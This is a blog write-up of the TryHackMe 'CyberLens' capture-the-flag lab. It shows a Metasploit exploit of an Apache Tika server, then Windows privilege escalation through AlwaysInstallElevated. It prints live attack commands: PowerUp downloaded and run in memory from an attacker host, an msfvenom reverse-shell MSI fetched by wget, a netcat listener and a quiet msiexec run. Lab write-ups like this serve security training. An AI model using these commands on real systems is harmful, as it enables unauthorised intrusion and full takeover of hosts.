---
layout: post
title: CyberLens writeup (TryHackMe)
author: wizarddos
category: writeups
excerpt_separator: <!--more-->
---

(Wanna watch a video version?)
<iframe width="560" height="315" src="https://www.youtube.com/embed/-LRlxsA8_7E?si=a_k2oFa32vAi_9U1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

Another day, another challenge. This time is easy one.
I don't know what to expect. I only know that there will be a webserver

Let's try it

It comes from [TryHackMe](https://tryhackme.com/r/room/cyberlensp6)

<!--more-->
First, add IP to `/etc/hosts`

I'll also add hostname to the enviromental variable

```
$ sudo echo 'MACHINE_IP cyberlens.thm' >> /etc/hosts
$ export HOST="cyberlens.thm"
```

Then, it's time for port scanning
```
$ rustscan -a $IP -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.138.96:80
Open 10.10.138.96:135
Open 10.10.138.96:139
Open 10.10.138.96:445
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 10.10.138.96
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-05-18 20:51 UTC
[...]
PORT    STATE SERVICE       REASON  VERSION
80/tcp  open  http          syn-ack Apache httpd 2.4.57 ((Win64))
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.57 (Win64)
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp open  msrpc         syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 33916/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 58379/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 23678/udp): CLEAN (Timeout)
|   Check 4 (port 10426/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-18T20:51:21
|_  start_date: N/A
```

It looks like windows machine - it'll be harder for me as I'm not acustomed to it. 

I couldn't get anything from other ports, so let's get to work on port `80`

### Website enumeration

JS on main page unveils another port
```js
fetch("http://cyberlens.thm:61777/meta", {
            method: "PUT",
            body: fileData,
            headers: {
              "Accept": "application/json",
              "Content-Type": "application/octet-stream"
            }
          })
```

Scanning it, gives us more info
```
$ nmap -sC -sV $IP -p61777 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 23:02 CEST
Nmap scan report for cyberlens.thm (10.10.138.96)
Host is up (0.074s latency).

PORT      STATE SERVICE VERSION
61777/tcp open  http    Jetty 8.y.z-SNAPSHOT
|_http-title: Welcome to the Apache Tika 1.17 Server
|_http-cors: HEAD GET
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
| http-methods: 
|_  Potentially risky methods: PUT
```

It runs Apache Tika - from my research it has an exploit in metasploit.

Launch it

### Exploiting

```
$ msfconsole
```

There's only one module for this service 
```
msf6 > use exploit/windows/http/apache_tika_jp2_jscript
```

We need to change `RHOSTS`, `RPORT` and `LHOST`
```
msf6 > set RHOSTS MACHINE_IP
msf6 > set RPORT 61777
msf6 > set LHOST YOUR_THM_IP
```

Then, we can run it
```
msf6 > exploit
```

Now, I've got a meterpreter shell - get user flag

I've spawned myself a typical CMD shell
```
meterpreter > shell
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
C:\Windows\system32>cd C:\Users\cyberlens\Desktop
C:\Users\CyberLens\Desktop>type user.txt
[REDACTED]
```

We've got a flag! Time for the hard part

### Privilege escalation

Let's fire up PowerShell
```
> powershell
```

Today, [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) became my best friend
```
PS > iex (iwr -usebasicparsing http://Your IP:8000/PowerUp.ps1)
```
And in kali
```
$ python3 -m http.server 8000
```

Then I run it and
```
PS > Invoke-allchecks

[*] Checking %PATH% for potentially hijackable .dll locations...


HijackablePath : C:\Users\CyberLens\AppData\Local\Microsoft\WindowsApps\
AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\CyberLens\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll' 
                 -Command '...'

[*] Checking for AlwaysInstallElevated registry key...


OutputFile    : 
AbuseFunction : Write-UserAddMSI
```

We see that there is a misconfigured registry key, that allows us to install MSI files as Admin.
[Time to exploit it](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#powerup)

First, create a payload on kali and set up python http server
```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f msi > shell.msi
$ python3 -m http.server 80
```
Then on windows I've downloaded that shell to Desktop
```
> wget http://10.9.3.108/shell.msi -o shell.msi
```

After setting up netcat listener
```
$ nc -lvnp 1337
```

I've executed malicious msi

```
> msiexec /quiet /qn /i shell.msi
```

And boom, we have shell. Let's grab the flag

```
> type C:\Users\Administrator\Desktop\root.txt
[REDACTED]
```
And that's it. Machine pwned

## Conclusion

I don't have too much experience with windows machines. While initial access was fairly easy, privesc was a little nightmare

I think I've spent like 3H on this box. Still kinda fun

I've discovered a new service, practices my metasploit usage and made learned windows privilege escalation method.

I really need to get things sorted out in windows privesc. I suck at it, not gonna lie.

Btw, check out my [normal blog](https://wizarddos.github.io/blog), where I post about overall IT and Programming

That's it - see you next time
